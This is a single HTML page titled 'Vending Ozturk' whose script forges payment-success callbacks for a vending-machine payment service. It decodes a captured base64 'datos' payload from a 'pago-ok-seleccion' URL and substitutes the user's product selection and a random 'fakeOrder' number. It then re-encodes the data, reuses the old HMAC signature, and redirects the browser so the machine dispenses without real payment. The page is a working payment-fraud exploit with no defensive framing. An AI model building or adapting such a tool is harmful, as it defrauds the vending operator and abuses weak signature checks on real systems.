<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Vending Ozturk</title>

  <style>
    :root{
      --bg:#0f1115;
      --card:#171a21;
      --text:#e8eaf0;
      --input:#222634;
      --border:#2a2f3a;
      --green:#1db954;
    }

    body{
      margin:0;
      padding:16px;
      font-family:Arial;
      background:var(--bg);
      color:var(--text);
    }

    .container{
      max-width:420px;
      margin:auto;
    }

    .box{
      background:var(--card);
      padding:14px;
      margin-bottom:12px;
      border-radius:14px;
    }

    input{
      width:100%;
      padding:12px;
      margin-top:6px;
      border-radius:10px;
      border:1px solid var(--border);
      background:var(--input);
      color:var(--text);
      font-size:16px;
      box-sizing:border-box;
    }

    button{
      width:100%;
      padding:16px;
      border:none;
      border-radius:14px;
      font-size:18px;
      font-weight:bold;
      cursor:pointer;
      background:var(--green);
      color:white;
      margin-top:6px;
    }

    .selected{
      outline:2px solid white;
    }
  </style>
</head>

<body>

<div class="container">

  <h2>📱 Vending Ozturk</h2>

  <div class="box">
    <button id="cafe1Btn" onclick="setCafe(1)">☕ Máquina Café 1</button>
    <button id="cafe2Btn" onclick="setCafe(2)">☕ Máquina Café 2</button>
  </div>

  <div class="box">
    <input id="seleccion" type="text" inputmode="numeric" placeholder="Ej: 777 o 1003" />
  </div>

  <div class="box">
    <input id="userEmail" placeholder="Email" />
  </div>

  <!-- AZÚCAR -->
  <div class="box" id="sugarBox" style="display:none;">
    <input id="sugarLevel" type="number" min="0" max="3" placeholder="Azúcar (0-3)" />
  </div>

  <!-- DS ORDER -->
  <div class="box">
    <label>Ds_Order (pedido generado)</label>
    <input id="orderView" type="text" readonly />
  </div>

  <button id="sendBtn" onclick="go()">PEDIR</button>

</div>

<script>

// BASES
const snackBase = "https://fersomaticweb.onrender.com/pago-ok-seleccion?datos=eyJjbGF2ZUJhc2U2NCI6Ikx3OVBQbTNBa3dYUEkwYWVhYnJQbHpaS1M1MXRTZElaIiwiZnVjIjoiMzY3NDQ1MDc5IiwibnVtZXJvUGVkaWRvIjoiRkVSNDMzNjgzMjk0IiwiaW1wb3J0ZUNlbnRzIjoiMTAwIiwic2VsZWNjaW9uIjoiMTE3IiwibWFjaGluZU5hbWUiOiJWOCBPWlRVUksgUVVFQkFCQSIsIm1hY2hpbmVJZCI6IjE4OTgzIiwidGlwbyI6InNlbGVjY2lvbiIsInpvbmEiOiJzbmFja3NlbGVjY2lvbiIsInVzZXJFbWFpbCI6IiIsImNsaWVudElkIjoiUGljYTI0aCIsInByb2R1Y3ROYW1lIjoiU0VMRUNDSU9OIDExNyJ9&Ds_SignatureVersion=HMAC_SHA256_V1&Ds_Signature=s1g8KcApEXkXb8TD_cKqw11NQJtnpUkhbkggV317qh0=";

const cafeBase = "https://fersomaticweb.onrender.com/pago-ok-seleccion?datos=...";
const cafeBase2 = "https://fersomaticweb.onrender.com/pago-ok-seleccion?datos=...";

function decode(b64){
  try { return JSON.parse(atob(b64)); }
  catch(e){ return {}; }
}

function encode(obj){
  return btoa(JSON.stringify(obj));
}

let cafeMachine = 1;
let isProcessing = false;

function setCafe(n){
  cafeMachine = n;
  document.getElementById('cafe1Btn').classList.remove('selected');
  document.getElementById('cafe2Btn').classList.remove('selected');
  document.getElementById('cafe' + n + 'Btn').classList.add('selected');
}

document.getElementById('seleccion').addEventListener('input', () => {
  const val = document.getElementById('seleccion').value;
  document.getElementById('sugarBox').style.display = (val.length === 4) ? 'block' : 'none';
});

function go(){

  if (isProcessing) return;
  isProcessing = true;

  const btn = document.getElementById("sendBtn");
  btn.innerText = "PROCESANDO...";

  const sel = document.getElementById('seleccion').value;
  const email = document.getElementById('userEmail').value;
  const sugar = document.getElementById('sugarLevel')?.value || 0;

  const base = (sel.length === 4)
    ? (cafeMachine === 1 ? cafeBase : cafeBase2)
    : snackBase;

  const url = new URL(base);

  const datos = decode(url.searchParams.get("datos"));
  const merchant = decode(url.searchParams.get("Ds_MerchantParameters"));

  const fakeOrder =
    "FER" +
    Math.floor(Math.random() * 1e9)
      .toString()
      .padStart(9,"0");

  document.getElementById("orderView").value = fakeOrder;

  datos.seleccion = sel;
  datos.userEmail = email;
  datos.sugarLevel = sugar;
  datos.numeroPedido = fakeOrder;

  merchant.Ds_Order = fakeOrder;

  url.searchParams.set("datos", encode(datos));
  url.searchParams.set("Ds_MerchantParameters", encode(merchant));

  console.log("ORDER:", fakeOrder);

  setTimeout(() => {
    window.location.href = url.toString();
  }, 150);
}

</script>

</body>
</html>
